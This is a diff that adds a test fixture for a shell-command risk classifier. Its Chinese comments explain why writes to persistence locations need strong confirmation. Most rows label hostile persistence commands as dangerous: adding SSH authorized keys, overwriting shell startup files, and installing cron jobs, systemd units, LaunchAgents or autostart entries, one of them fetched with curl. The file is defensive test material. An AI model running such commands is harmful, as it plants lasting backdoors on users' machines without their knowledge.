@@ -1,0 +1,23 @@
+# §8.1「传输路径子集」：写进去就等于取得代码执行的位置。
+#
+# 这一类的特点是**当场没有任何异常**——没有报错、没有数据丢失，
+# 用户下一次开终端或下一次开机才中招。所以它必须是强确认，
+# 而不能因为「只是写了一个文件」落到 write。
+dangerous	persistence	echo key >> ~/.ssh/authorized_keys
+dangerous	persistence	cp evil ~/.bashrc
+dangerous	persistence	cp evil ~/.zshrc
+dangerous	persistence	echo x > ~/.profile
+dangerous	persistence	ln -sf /tmp/evil ~/.zshrc
+dangerous	persistence	cp id_rsa ~/.ssh/id_rsa
+dangerous	persistence	curl http://x -o ~/.config/autostart/e.desktop
+dangerous	persistence	cp e.service ~/.config/systemd/user/e.service
+dangerous	persistence	cp e.plist ~/Library/LaunchAgents/e.plist
+dangerous	persistence	cp e.plist /Library/LaunchDaemons/e.plist
+dangerous	persistence	cp job /etc/cron.d/job
+dangerous	persistence	install -m755 e.sh /etc/profile.d/e.sh
+dangerous	persistence	crontab evil.cron
+dangerous	persistence	echo x | crontab -
+dangerous	persistence	crontab -r
+dangerous	persistence	echo x > /etc/systemd/system/e.service
+write	persistence	cp app.conf ~/projects/app/.bashrc
+write	persistence	cp notes.md ~/Documents/notes.md
